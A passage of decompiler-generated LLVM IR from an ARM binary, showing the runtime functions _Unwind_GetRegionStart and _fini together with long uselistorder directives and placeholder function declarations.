1341, 942, 541, 546, 547, 545, 544, 548, 542, 543, 1335, 1336, 1337, 1338, 943, 553, 559, 552, 558, 557, 551, 561, 560, 555, 549, 554, 550, 556, 1333, 1334, 734, 219, 221, 220, 1221, 735, 1222, 1223, 1224, 1225, 1226, 944, 193, 194, 192, 195, 1285, 1286, 1287, 1288, 1289, 1290, 686, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 737, 1299, 1300, 1301, 1302, 1303, 736, 1304, 1305, 1306, 1307, 1308, 945, 417, 419, 415, 418, 422, 424, 421, 423, 425, 420, 426, 416, 249, 248, 946, 228, 227, 947, 414, 413, 948, 367, 949, 562, 950, 951, 563, 952, 953, 564, 954, 291, 290, 955, 956, 565, 957, 270, 269, 958, 959, 566, 960, 962, 961, 567, 568, 1256, 963, 1166, 1167, 1403, 1404, 964, 569, 647, 1405, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 965, 241, 239, 240, 242, 243, 1281, 1282, 87, 88, 1457, 1458, 1459, 1460, 90, 89, 1229, 1228, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1508, 149, 150, 151, 738, 966, 1253, 1250, 1251, 1252, 672, 648, 202, 203, 205, 204, 1240, 1058, 1241, 1242, 1059, 1243, 1244, 1245, 1246, 1247, 215, 207, 208, 210, 213, 211, 209, 212, 206, 214, 1234, 1235, 1236, 739, 1237, 1238, 1239, 967, 600, 603, 601, 596, 604, 597, 599, 602, 598, 1106, 1107, 968, 310, 309, 308, 313, 311, 312, 1254, 1255, 969, 322, 321, 318, 317, 316, 320, 319, 323, 1108, 1109, 1110, 970, 182, 183, 184, 181, 179, 186, 180, 185, 680, 1406, 1407, 741, 1408, 1409, 1410, 1411, 1412, 742, 1413, 1414, 1415, 1416, 1417, 743, 1419, 668, 667, 1418, 740, 1420, 1421, 744, 1422, 1423, 1424, 975, 774, 974, 973, 972, 971, 164, 162, 163, 167, 171, 161, 168, 169, 165, 170, 166, 1425, 976, 572, 575, 574, 576, 571, 573, 649, 977, 455, 454, 1426, 1427, 1428, 157, 159, 158, 160, 681, 616, 1431, 1432, 636, 1433, 1434, 5, 6, 1435, 1437, 621, 1438, 746, 1439, 637, 1436, 745, 987, 986, 985, 984, 983, 982, 981, 980, 979, 978, 152, 153, 154, 747, 650, 988, 146, 147, 148, 1429, 689, 1430, 673, 775, 989, 577, 1098, 748, 1097, 674, 992, 991, 990, 579, 584, 578, 580, 586, 583, 581, 582, 585, 587, 749, 1099, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 651, 993, 589, 588, 590, 594, 591, 592, 593, 994, 995, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 996, 68, 72, 74, 71, 69, 73, 70, 75, 997, 998, 999, 176, 1000, 595, 1001, 444, 1003, 1002, 442, 443, 1382, 611, 1383, 1111, 1112, 1113, 1114, 1115, 1116, 753, 1117, 1118, 617, 751, 752, 754, 1119, 755, 1120, 750, 1121, 1122, 1012, 1011, 1010, 1009, 1008, 1007, 1006, 1005, 1004, 759, 756, 757, 758, 760, 761, 1016, 1015, 1014, 1013, 1018, 1017, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1019, 776, 1020, 1021, 1133, 612, 618, 1134, 1135, 1136, 1137, 613, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1024, 1023, 1022, 127, 1146, 762, 763, 764, 1027, 1026, 1025, 1147, 1028, 266, 1148, 765, 1032, 1031, 1030, 1029, 766, 1149, 767, 1150, 768, 769, 1041, 1040, 1039, 1038, 1037, 1036, 1035, 1034, 1033, 118, 1151, 1152, 1153, 1043, 1042, 1044, 669, 1160, 7, 1161, 1045, 1047, 1046, 1049, 1048, 694, 1440, 1441, 693, 1442, 1443, 695, 696, 1444, 1445, 1050, 1461, 1052, 1051, 1053, 1054, 605, 778 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_199bc = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_199c4 = add i32 %tmp1, 72
  %v2_199c4 = inttoptr i32 %v1_199c4 to i32*
  %v3_199c4 = load i32, i32* %v2_199c4, align 4
  ret i32 %v3_199c4

; uselistorder directives
  uselistorder i32 72, { 15, 16, 0, 17, 1, 10, 11, 8, 9, 2, 4, 5, 12, 6, 3, 7, 13, 14 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 12, 11, 14, 13, 136, 137, 138, 139, 119, 120, 54, 61, 10, 62, 64, 5, 7, 8, 65, 66, 2, 0, 1, 76, 35, 16, 38, 17, 63, 36, 37, 140, 60, 18, 99, 117, 15, 141, 142, 143, 144, 145, 147, 148, 146, 149, 150, 151, 152, 153, 154, 155, 19, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 20, 55, 56, 57, 58, 59, 39, 40, 21, 41, 42, 43, 156, 9, 4, 44, 46, 47, 45, 48, 53, 109, 110, 111, 112, 113, 114, 115, 116, 100, 101, 102, 103, 104, 105, 106, 107, 108, 3, 67, 68, 69, 70, 71, 22, 72, 23, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 95, 88, 89, 90, 91, 92, 93, 94, 96, 97, 24, 98, 73, 6, 25, 26, 27, 29, 28, 30, 134, 74, 75, 31, 32, 49, 50, 51, 52, 34, 118, 135, 33 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_199d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_199d8)
  %v31_199e0 = load i32, i32* @r0, align 4
  ret i32 %v31_199e0

; uselistorder directives
  uselistorder i32* @r0, { 28, 29, 30, 324, 325, 259, 253, 254, 255, 256, 257, 258, 31, 26, 260, 102, 261, 5, 103, 262, 263, 101, 104, 264, 32, 27, 265, 266, 267, 268, 119, 33, 120, 121, 34, 35, 269, 270, 271, 272, 273, 274, 25, 275, 276, 36, 6, 170, 172, 106, 171, 2, 183, 182, 46, 184, 37, 185, 186, 187, 7, 38, 39, 326, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 200, 201, 202, 212, 213, 214, 215, 216, 217, 218, 219, 220, 109, 234, 122, 235, 236, 237, 239, 238, 18, 19, 206, 277, 278, 124, 125, 327, 330, 331, 123, 40, 328, 329, 240, 241, 242, 243, 249, 41, 133, 134, 135, 20, 332, 21, 43, 174, 3, 175, 22, 23, 44, 8, 208, 47, 279, 280, 98, 99, 281, 282, 283, 100, 284, 285, 286, 48, 287, 288, 290, 291, 49, 78, 173, 176, 177, 178, 179, 180, 181, 50, 51, 126, 127, 128, 318, 69, 319, 70, 71, 72, 73, 75, 333, 334, 320, 321, 52, 336, 113, 114, 115, 116, 53, 292, 293, 9, 54, 55, 337, 338, 10, 56, 57, 227, 228, 11, 58, 59, 117, 118, 335, 199, 60, 136, 137, 138, 139, 129, 130, 248, 61, 110, 111, 244, 12, 245, 246, 247, 203, 107, 204, 205, 108, 62, 229, 230, 231, 232, 233, 156, 63, 157, 223, 64, 224, 221, 65, 222, 225, 66, 226, 163, 67, 164, 250, 42, 80, 68, 294, 295, 296, 45, 82, 207, 74, 297, 298, 299, 13, 14, 300, 301, 15, 17, 0, 1, 302, 303, 16, 304, 305, 306, 77, 112, 307, 308, 309, 310, 311, 76, 312, 24, 313, 314, 4, 315, 289, 131, 132, 209, 210, 211, 316, 165, 79, 166, 81, 140, 141, 142, 105, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 158, 159, 160, 161, 162, 167, 168, 169, 251, 252, 317, 322, 323, 83, 84, 85, 86, 94, 95, 96, 97, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder void (i32)* @__pseudo_branch, { 17, 115, 108, 109, 110, 111, 112, 113, 114, 116, 117, 118, 82, 83, 84, 92, 93, 54, 55, 56, 119, 52, 53, 94, 18, 19, 20, 21, 22, 23, 120, 97, 98, 99, 100, 101, 104, 1, 2, 125, 126, 127, 128, 129, 130, 131, 121, 135, 136, 137, 138, 105, 106, 24, 25, 26, 102, 103, 46, 47, 48, 49, 50, 51, 88, 122, 123, 124, 0, 34, 35, 36, 27, 28, 29, 30, 31, 32, 43, 44, 45, 132, 133, 134, 89, 90, 91, 63, 64, 65, 85, 86, 87, 139, 70, 71, 72, 73, 74, 75, 66, 67, 68, 69, 37, 38, 76, 77, 39, 40, 95, 96, 33, 78, 79, 80, 81, 57, 58, 59, 60, 61, 62, 41, 42, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 107 }
  uselistorder i32 0, { 436, 435, 481, 482, 2035, 440, 439, 483, 2036, 2037, 2038, 2039, 380, 379, 484, 2040, 2041, 254, 2042, 2044, 2045, 187, 188, 2046, 2047, 2043, 110, 111, 112, 113, 2, 1, 3, 0, 243, 242, 244, 245, 246, 2048, 437, 438, 178, 167, 2049, 2050, 248, 249, 247, 250, 2051, 2052, 2053, 2054, 253, 252, 251, 2055, 2056, 2057, 427, 426, 485, 441, 486, 442, 487, 443, 488, 489, 490, 189, 2058, 457, 456, 2059, 2060, 455, 454, 2061, 491, 452, 453, 450, 451, 449, 448, 2062, 447, 446, 445, 444, 385, 2063, 2079, 2064, 257, 2065, 2066, 2067, 2068, 2069, 2070, 259, 2072, 2073, 255, 256, 2074, 2075, 162, 190, 2076, 2077, 1107, 114, 115, 428, 429, 258, 2071, 2078, 384, 2080, 492, 493, 2081, 459, 458, 260, 2082, 2083, 261, 2084, 2085, 2086, 137, 494, 495, 2087, 262, 2088, 2089, 2090, 263, 2091, 2092, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2100, 34, 163, 496, 2101, 264, 2102, 2103, 2104, 4, 2105, 2106, 5, 2107, 2108, 6, 1694, 7, 1695, 1696, 1108, 477, 478, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 9, 10, 11, 1704, 1705, 8, 1706, 1707, 1109, 12, 1708, 1709, 35, 1110, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 130, 129, 265, 266, 267, 1718, 1719, 1720, 13, 1721, 1722, 36, 1723, 1724, 1725, 37, 38, 235, 1726, 1727, 1728, 1729, 39, 236, 497, 1730, 1731, 1732, 1733, 1734, 1735, 40, 1736, 15, 14, 41, 1111, 1737, 1113, 1112, 1738, 1739, 1740, 1741, 1742, 16, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1114, 1196, 1743, 1744, 1745, 1746, 1747, 17, 1748, 1115, 1749, 1750, 1751, 1752, 237, 238, 498, 1753, 1754, 19, 18, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1116, 1117, 1762, 1119, 1763, 1764, 1120, 1121, 1765, 1766, 1118, 1767, 1122, 1768, 1123, 1769, 1770, 1771, 1772, 20, 2109, 2110, 2111, 179, 2112, 2113, 2114, 2115, 2116, 268, 2117, 1124, 1127, 1125, 1126, 2118, 1128, 1351, 1352, 53, 54, 1361, 1362, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1363, 1370, 1365, 1366, 1367, 1368, 270, 1369, 269, 1397, 271, 1404, 1405, 1406, 168, 1407, 169, 1408, 170, 1409, 171, 1410, 272, 1411, 1412, 1773, 1774, 1413, 1415, 1416, 1418, 1417, 273, 1419, 1420, 21, 180, 2119, 499, 2120, 1421, 274, 1422, 1423, 276, 277, 138, 139, 1424, 275, 1425, 1426, 1427, 1428, 191, 192, 1429, 1430, 1431, 278, 1432, 1433, 430, 1434, 1435, 500, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 116, 1443, 1444, 140, 1472, 1473, 1474, 1475, 1476, 1477, 386, 1478, 1479, 1480, 1490, 1481, 1547, 1576, 1577, 1578, 1489, 193, 194, 1579, 460, 420, 421, 501, 1580, 1581, 1582, 1584, 1585, 1586, 1587, 42, 1588, 1589, 55, 387, 431, 1590, 1591, 1592, 1593, 1596, 1597, 1602, 1605, 1607, 1608, 279, 1609, 1129, 1610, 1594, 1583, 1130, 381, 1131, 1595, 1612, 1613, 1614, 56, 1641, 57, 1640, 195, 1642, 1643, 280, 1197, 1198, 1199, 1200, 1201, 141, 1202, 1203, 281, 1204, 43, 282, 1205, 502, 1206, 1207, 422, 283, 284, 503, 504, 286, 1644, 1645, 1646, 1647, 1648, 287, 285, 505, 506, 1649, 1650, 1651, 1652, 288, 507, 1653, 508, 58, 59, 60, 61, 479, 289, 1654, 172, 1655, 291, 290, 509, 510, 1255, 1256, 388, 181, 1491, 1492, 1493, 1494, 1495, 1775, 1776, 1777, 1778, 1779, 1780, 292, 131, 423, 1781, 1782, 1783, 117, 1496, 511, 1497, 1498, 1499, 1784, 1132, 1785, 1786, 1787, 512, 1788, 1789, 1790, 1133, 1791, 1792, 1793, 1794, 461, 462, 1211, 1212, 513, 1414, 514, 1208, 1218, 1219, 22, 515, 1209, 196, 516, 2121, 2122, 2123, 23, 24, 197, 198, 199, 2128, 2129, 25, 1210, 200, 300, 299, 302, 301, 293, 294, 297, 298, 296, 295, 1398, 1399, 1400, 1401, 517, 1656, 1657, 1676, 303, 1677, 1681, 1682, 1683, 1684, 1685, 304, 1686, 201, 1687, 1688, 1689, 1690, 306, 305, 307, 1691, 308, 1257, 1258, 164, 62, 2130, 118, 389, 2134, 2135, 63, 1371, 142, 1372, 1373, 1374, 390, 202, 2131, 2132, 2133, 391, 203, 1134, 1795, 64, 204, 1796, 1797, 392, 205, 1135, 394, 1798, 65, 165, 1799, 1800, 393, 2136, 2137, 2138, 2139, 2140, 2143, 2144, 2145, 2146, 2147, 2148, 2149, 2150, 2151, 2152, 2141, 2142, 2153, 2154, 2155, 2156, 2157, 2158, 2159, 2160, 44, 2161, 2162, 2163, 2164, 2165, 45, 2166, 2167, 2168, 46, 2169, 2170, 2171, 47, 2172, 2173, 2174, 2175, 2176, 2177, 2178, 2179, 2180, 2181, 2182, 2183, 2184, 2185, 2186, 2187, 2188, 2189, 2190, 2191, 2192, 2193, 2194, 2195, 2198, 2199, 2200, 2201, 2202, 2203, 2204, 2196, 2197, 2205, 2206, 2207, 2208, 2209, 2210, 2211, 2212, 2213, 2214, 48, 2215, 2216, 2217, 2218, 2219, 49, 2220, 2221, 2222, 2223, 2224, 50, 2225, 2226, 2227, 2228, 2229, 2230, 2231, 2232, 2233, 2234, 2235, 2236, 2237, 2238, 2239, 1500, 1501, 1535, 518, 519, 1536, 1537, 1375, 1136, 1376, 1377, 1378, 1379, 1801, 1802, 1803, 1804, 1823, 310, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 207, 206, 311, 312, 1836, 1837, 1838, 1839, 1840, 1841, 208, 209, 1842, 1843, 1844, 1845, 1846, 1847, 51, 1848, 1849, 1850, 1851, 1852, 66, 313, 1853, 210, 521, 1854, 1855, 1856, 1857, 1858, 522, 314, 1859, 1860, 1861, 1862, 468, 1863, 1864, 1865, 467, 1866, 1867, 466, 1868, 1869, 309, 1870, 520, 1871, 316, 1872, 52, 1873, 463, 432, 1874, 1875, 1876, 523, 524, 1877, 1878, 1879, 464, 465, 1880, 1881, 1882, 315, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 26, 1890, 1891, 1892, 1137, 1893, 1894, 1895, 1896, 1897, 1898, 1900, 1899, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1917, 1918, 1916, 1913, 1914, 1915, 27, 395, 1920, 1919, 396, 1921, 1922, 211, 1923, 317, 319, 1402, 318, 1403, 320, 1364, 212, 1380, 1385, 1386, 1381, 1382, 1383, 1388, 1389, 1390, 321, 1391, 1392, 1393, 1394, 1395, 1384, 1387, 1396, 213, 1213, 1214, 1215, 322, 1216, 1217, 323, 1220, 1224, 1225, 1226, 1227, 324, 1221, 325, 1222, 1223, 214, 1228, 1999, 2240, 2241, 2242, 2124, 2125, 2126, 326, 2127, 2001, 2000, 1658, 1482, 1318, 1229, 1230, 2002, 2243, 2244, 2245, 2246, 2247, 2248, 1231, 2249, 327, 2250, 2251, 2252, 1615, 1616, 328, 2003, 2030, 2004, 1138, 2005, 2006, 2007, 2008, 67, 144, 2009, 2010, 2011, 526, 2013, 2014, 2015, 2016, 1139, 2017, 527, 2018, 2019, 68, 145, 2020, 2021, 469, 2022, 1140, 2023, 2024, 2025, 528, 1141, 69, 143, 2028, 525, 2029, 1142, 1171, 1172, 70, 71, 146, 1173, 529, 530, 531, 1174, 217, 329, 424, 425, 532, 2257, 1146, 2258, 533, 2259, 2260, 534, 2261, 2262, 1144, 330, 398, 2263, 1145, 2264, 535, 119, 2265, 2266, 536, 2275, 2276, 2279, 1143, 397, 2280, 470, 216, 215, 2277, 2278, 2253, 2254, 1147, 331, 382, 1175, 28, 29, 2273, 1924, 2274, 1611, 2031, 173, 2032, 1148, 332, 2033, 2034, 2267, 2268, 2269, 2270, 537, 2271, 218, 1313, 1314, 174, 1232, 1233, 1149, 1234, 538, 1235, 1236, 1237, 1238, 1239, 72, 73, 147, 1240, 74, 75, 148, 2026, 2027, 132, 400, 1338, 1335, 1336, 1150, 1337, 1339, 1151, 1340, 1341, 1342, 1343, 76, 77, 149, 1344, 333, 1345, 1346, 1347, 1349, 1348, 399, 1176, 1178, 1177, 334, 1179, 1180, 1181, 539, 1182, 219, 2255, 2256, 1462, 1463, 1464, 1465, 1466, 1467, 336, 220, 1468, 1469, 1470, 175, 335, 1471, 1244, 1245, 540, 1241, 221, 1242, 222, 1243, 337, 1259, 1260, 1261, 30, 1329, 176, 1246, 223, 542, 543, 2272, 541, 224, 225, 1671, 1672, 1673, 1674, 1675, 338, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 339, 1659, 544, 1660, 1661, 545, 1662, 1663, 226, 1483, 546, 340, 1484, 1485, 1486, 1487, 1488, 227, 1617, 1618, 344, 342, 343, 1619, 1620, 350, 349, 240, 341, 1621, 1622, 1623, 1624, 1625, 1626, 434, 433, 471, 547, 1627, 1628, 1629, 120, 1630, 346, 345, 347, 348, 239, 1631, 1632, 401, 1633, 1634, 185, 1635, 1636, 1637, 1638, 1639, 1606, 1296, 1310, 1309, 1601, 1600, 1599, 1598, 1320, 1604, 1603, 1321, 1323, 1322, 1692, 1548, 351, 352, 353, 1925, 1926, 355, 1927, 1928, 354, 1929, 356, 1930, 1931, 402, 1932, 1678, 1679, 1680, 31, 2281, 2282, 150, 548, 357, 1933, 1934, 1935, 1936, 1937, 358, 1538, 1152, 1539, 1540, 228, 229, 362, 1502, 360, 1503, 1524, 1517, 1153, 1518, 1519, 1520, 1521, 78, 79, 153, 1522, 1523, 403, 1525, 1526, 1154, 1527, 359, 1528, 80, 81, 152, 1529, 1530, 1155, 1531, 1532, 82, 83, 151, 1533, 361, 1534, 1504, 1156, 1505, 1506, 549, 1507, 1508, 1157, 1509, 1510, 1513, 1511, 1512, 404, 1514, 84, 85, 155, 1515, 1158, 86, 87, 154, 1516, 1262, 1159, 1263, 1264, 1265, 1266, 1267, 1541, 1160, 1542, 1543, 1544, 1545, 1546, 1268, 1161, 1269, 1270, 1271, 1272, 1273, 1938, 1939, 1940, 1941, 1942, 230, 1943, 1944, 1945, 1946, 1948, 1949, 1947, 1950, 231, 1951, 1954, 1952, 1953, 363, 550, 1955, 1956, 1957, 364, 365, 1958, 1959, 1960, 1961, 1962, 1963, 551, 1964, 1965, 552, 1966, 1968, 366, 1967, 405, 383, 1969, 1970, 1972, 232, 1973, 368, 1974, 124, 125, 122, 123, 1975, 553, 182, 177, 1976, 1977, 1978, 371, 369, 370, 554, 1979, 1980, 1981, 121, 367, 1982, 1983, 1984, 1985, 1986, 1987, 1988, 1989, 1990, 555, 183, 418, 133, 1991, 1992, 1993, 32, 372, 1183, 1184, 186, 126, 166, 1971, 406, 1248, 1247, 409, 1250, 1251, 1249, 407, 408, 1252, 1253, 556, 1254, 1552, 1553, 1162, 1554, 1555, 1556, 1163, 1557, 1558, 88, 89, 156, 1559, 1560, 1561, 127, 128, 1562, 1563, 1564, 373, 1565, 1566, 1567, 1568, 1569, 557, 1570, 1571, 1572, 1573, 1574, 241, 1994, 1575, 1445, 1164, 1446, 1447, 90, 91, 158, 1448, 1449, 1450, 1165, 1451, 1452, 1453, 1454, 1166, 1455, 1456, 92, 93, 157, 1457, 1458, 1459, 1460, 1461, 558, 374, 2012, 559, 1325, 1324, 1315, 1549, 1550, 1551, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 33, 1805, 1806, 1807, 1808, 184, 1809, 375, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 376, 1167, 1170, 1168, 1169, 1817, 1818, 1819, 1820, 1821, 1822, 561, 566, 1285, 1286, 94, 159, 560, 95, 410, 567, 1287, 96, 134, 564, 565, 97, 135, 568, 569, 563, 411, 570, 562, 571, 1288, 1289, 1290, 1292, 419, 1291, 1293, 1294, 574, 575, 572, 573, 1295, 583, 576, 579, 577, 580, 578, 581, 1297, 582, 584, 1298, 1299, 1300, 585, 1301, 233, 234, 1302, 98, 415, 414, 1303, 1304, 99, 413, 412, 1305, 100, 101, 102, 103, 104, 105, 106, 586, 1306, 587, 590, 1307, 588, 589, 591, 1308, 592, 472, 593, 1311, 594, 1312, 1317, 107, 136, 1316, 473, 596, 597, 595, 1319, 598, 377, 600, 601, 602, 1326, 603, 1327, 604, 605, 599, 416, 606, 1328, 607, 608, 610, 1330, 1331, 609, 1332, 1333, 108, 160, 161, 1334, 611, 378, 109, 1350, 612, 1693, 1995, 1996, 480, 1997, 1998, 417, 2283, 474, 1185, 475, 476, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 2284, 2285, 2286, 2287, 2288, 2289, 2290, 2291, 2292, 2293, 2294, 2295, 2296, 2297, 2298 }
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
